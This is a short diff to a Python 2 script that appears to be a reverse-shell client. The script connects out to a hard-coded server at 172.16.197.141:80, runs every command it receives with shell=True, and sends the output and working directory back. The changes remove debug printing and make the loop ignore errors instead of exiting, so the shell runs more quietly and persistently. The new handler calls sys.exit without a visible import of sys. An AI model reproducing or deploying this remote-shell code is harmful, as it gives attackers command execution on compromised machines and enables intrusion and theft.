@@ -1,5 +1,4 @@
 import os, subprocess, socket
-from pprint import pprint
 
 _SERVER = '172.16.197.141'
 _PORT = 80
@@ -44,7 +43,6 @@ def main():
                     if _MODE:
                         arg_list.insert(0, _MODE)
                     command = ' '.join(arg_list)
-                    print(command)
                     try:
                         out = subprocess.check_output(arg_list, shell=True)
                         s.send(str(out) + os.getcwd() + ">")
@@ -55,8 +53,10 @@ def main():
                     s.send(os.getcwd()+ ">")
             except socket.error, ex:
                 break
+            except KeyboardInterrupt, ex:
+                sys.exit()
             except Exception, ex:
-                exit
+                continue
 
 if __name__ == '__main__':
     main()
